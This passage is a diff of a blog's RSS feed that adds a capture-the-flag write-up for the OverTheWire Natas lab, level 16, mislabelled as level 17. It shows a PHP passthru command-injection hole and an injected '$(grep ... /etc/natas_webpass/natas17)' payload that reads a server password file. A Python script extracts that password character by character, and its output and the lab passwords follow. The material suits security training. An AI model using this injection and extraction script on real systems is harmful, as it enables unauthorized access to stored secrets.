@@ -7,10 +7,165 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>cn</language>
     <copyright>Copyright © 2008–2019</copyright>
-    <lastBuildDate>Sat, 24 Aug 2024 14:37:52 +0300</lastBuildDate>
+    <lastBuildDate>Sun, 25 Aug 2024 21:17:22 +0300</lastBuildDate>
     
 	<atom:link href="//localhost:1313/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Natas-Level 17</title>
+      <link>//localhost:1313/post/natas17/</link>
+      <pubDate>Sun, 25 Aug 2024 21:17:22 +0300</pubDate>
+      
+      <guid>//localhost:1313/post/natas17/</guid>
+      <description>&lt;h3 id=&#34;login&#34;&gt;Login&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Username: natas17&lt;/em&gt;&lt;br&gt;
+&lt;em&gt;Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC&lt;/em&gt;&lt;br&gt;
+&lt;em&gt;URL:      &lt;a href=&#34;http://natas17.natas.labs.overthewire.org&#34;&gt;http://natas17.natas.labs.overthewire.org&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;doc&#34;&gt;Doc&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Brute-force_attack&#34;&gt;What is brute-forcing?&lt;/a&gt;&lt;br&gt;
+In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.&lt;br&gt;
+&lt;a href=&#34;https://en.wikipedia.org/wiki/Python_(programming_language)&#34;&gt;What is python?&lt;/a&gt;&lt;br&gt;
+Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.&lt;br&gt;
+&lt;a href=&#34;https://en.wikipedia.org/wiki/PHP&#34;&gt;What is php?&lt;/a&gt;&lt;br&gt;
+PHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.&lt;/p&gt;
+&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;
+&lt;p&gt;We should examine the index page of &lt;strong&gt;natas16&lt;/strong&gt; as per usual. There is a word search field just like in a previous letter and a search button.&lt;/p&gt;
+&lt;img src=&#34;//localhost:1313/img/natas/natas16-1.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+&lt;strong&gt;Source code:&lt;/strong&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/css/level.css&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/css/jquery-ui.css&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/css/wechall.css&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/js/jquery-ui.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;http://natas.labs.overthewire.org/js/wechall-data.js&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/js/wechall.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#00a8c8&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;wechallinfo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;level&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;natas16&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;&amp;lt;censored&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#111&#34;&gt;};&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;natas16&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;For security reasons, we now filter even more on certain characters&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;/&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Find words containing: &lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;needle&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;submit&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;submit&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;Search&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Output:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;pre&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;$key = &amp;#34;&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;if(array_key_exists(&amp;#34;needle&amp;#34;, $_REQUEST)) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    $key = $_REQUEST[&amp;#34;needle&amp;#34;];
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;if($key != &amp;#34;&amp;#34;) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    if(preg_match(&amp;#39;/[;|&amp;amp;`\&amp;#39;&amp;#34;]/&amp;#39;,$key)) {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        print &amp;#34;Input contains an illegal character!&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    } else {
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        passthru(&amp;#34;grep -i \&amp;#34;$key\&amp;#34; dictionary.txt&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;pre&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;viewsource&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;index-source.html&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;View sourcecode&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4 id=&#34;what-does-this-code-do&#34;&gt;What does this code do?&lt;/h4&gt;
+&lt;p&gt;The important selection out of all of that code is this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if(array_key_exists(&amp;#34;needle&amp;#34;, $_REQUEST)) {
+    $key = $_REQUEST[&amp;#34;needle&amp;#34;];
+}
+
+if($key != &amp;#34;&amp;#34;) {
+    if(preg_match(&amp;#39;/[;|&amp;amp;`\&amp;#39;&amp;#34;]/&amp;#39;,$key)) {
+        print &amp;#34;Input contains an illegal character!&amp;#34;;
+    } else {
+        passthru(&amp;#34;grep -i \&amp;#34;$key\&amp;#34; dictionary.txt&amp;#34;);
+    }
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This code snippet submits the sent data from the &lt;strong&gt;natas16 index page&lt;/strong&gt; and searches the dictionary.txt file in order to find matching words that contain the given pattern. There is also some illegal character filter in place in order to make PHP injection more difficult to perform. The sollution to this level will be extremly similar to that of &lt;strong&gt;natas15&lt;/strong&gt; since we are gonna try data and use the response packets we get in order to filter out usefull data.&lt;/p&gt;
+&lt;h4 id=&#34;grep-documentation-needed&#34;&gt;Grep documentation needed:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep (1)             - print lines that match patterns
+    -E, --extended-regexp     PATTERNS are extended regular expressions
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are gonna do an extended regex in order to fill out characters in the password for &lt;strong&gt;natas17&lt;/strong&gt; in conjunction with a word that we know is present in the &lt;strong&gt;dictionary.txt&lt;/strong&gt; file, then if the response contains the word, we know that the selected character is in the password, otherwise not.&lt;/p&gt;
+&lt;h4 id=&#34;grep-format&#34;&gt;Grep format:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$(grep -E ^ string/character.* /etc/natas_webpass/natas17)Existing_key
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We need to find a string that appears in &lt;strong&gt;dictionary.txt&lt;/strong&gt;:&lt;/p&gt;
+&lt;img src=&#34;//localhost:1313/img/natas/natas16-2.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+Now all that is left to do is implement this in a python script just like we did previously.
+&lt;h4 id=&#34;the-script&#34;&gt;The script:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
+
+target = &amp;#39;http://natas16.natas.labs.overthewire.org&amp;#39;
+possible = &amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;
+
+
+final = &amp;#39;&amp;#39;
+i = 0
+while len(final) != 32:
+	while i &amp;lt; len(possible):
+		character = possible[i]
+		needle = (&amp;#39;$(grep -E ^%s%c.* /etc/natas_webpass/natas17)abandoned&amp;#39; % (final, character))
+		req = requests.get(target,
+			auth=(&amp;#39;natas16&amp;#39;,&amp;#39;hPkjKYviLQctEW33QmuXL6eDVfMW4sGo&amp;#39;),
+			params={&amp;#34;needle&amp;#34;: needle}
+		)
+		if &amp;#34;abandoned&amp;#34; not in req.text:
+			final += character
+			print (&amp;#39;Password so far : &amp;#39; + final)
+			i = 0
+		else:
+			i += 1
+print (&amp;#34;----Script Finished----&amp;#34;)
+print (&amp;#34;Password is : &amp;#34; + final)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now all that is left to do is run the script and obtain the password for &lt;strong&gt;natas17&lt;/strong&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;script-run&#34;&gt;Script run:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;02:59:31 archie@Archie python → python3 scriptnatas16.py
+Password so far : E
+Password so far : Eq
+Password so far : Eqj
+Password so far : EqjH
+Password so far : EqjHJ
+Password so far : EqjHJb
+Password so far : EqjHJbo
+Password so far : EqjHJbo7
+Password so far : EqjHJbo7L
+Password so far : EqjHJbo7LF
+Password so far : EqjHJbo7LFN
+Password so far : EqjHJbo7LFNb
+Password so far : EqjHJbo7LFNb8
+Password so far : EqjHJbo7LFNb8v
+Password so far : EqjHJbo7LFNb8vw
+Password so far : EqjHJbo7LFNb8vwh
+Password so far : EqjHJbo7LFNb8vwhH
+Password so far : EqjHJbo7LFNb8vwhHb
+Password so far : EqjHJbo7LFNb8vwhHb9
+Password so far : EqjHJbo7LFNb8vwhHb9s
+Password so far : EqjHJbo7LFNb8vwhHb9s7
+Password so far : EqjHJbo7LFNb8vwhHb9s75
+Password so far : EqjHJbo7LFNb8vwhHb9s75h
+Password so far : EqjHJbo7LFNb8vwhHb9s75ho
+Password so far : EqjHJbo7LFNb8vwhHb9s75hok
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5T
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+----Script Finished----
+Password is : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
     
     <item>
       <title>Natas-Level 16</title>
@@ -43,213 +198,128 @@ PHP is a general-purpose scripting language geared towards web development. It w
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#75af00&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d88200&#34;&gt;&amp;#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#111&#34;&gt;&amp;gt;&lt;/span&gt;
